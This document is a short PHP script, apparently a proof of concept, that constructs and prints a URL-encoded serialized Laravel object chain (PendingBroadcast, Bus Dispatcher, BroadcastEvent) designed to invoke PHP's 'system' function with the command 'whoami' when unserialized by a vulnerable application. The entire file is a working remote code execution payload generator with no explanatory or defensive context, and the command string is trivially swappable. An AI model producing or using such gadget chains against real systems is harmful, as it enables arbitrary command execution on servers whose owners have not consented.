<?php
// 1.php
namespace Illuminate\Broadcasting {
    class PendingBroadcast {
        protected $events;
        protected $event;

        public function __construct($events, $event) {
            $this->events = $events;
            $this->event = $event;
        }
    }

    class BroadcastEvent {
        public $connection;
        public function __construct($connection) {
            $this->connection = $connection;
        }
    }
}

namespace Illuminate\Bus {
    class Dispatcher {
        protected $queueResolver;
        public function __construct($queueResolver){
            $this->queueResolver = $queueResolver;
        }
    }
}


namespace {
    $c = new Illuminate\Broadcasting\BroadcastEvent('whoami');
    $b = new Illuminate\Bus\Dispatcher('system');
    $a = new Illuminate\Broadcasting\PendingBroadcast($b, $c);
    print(urlencode(serialize($a)));
}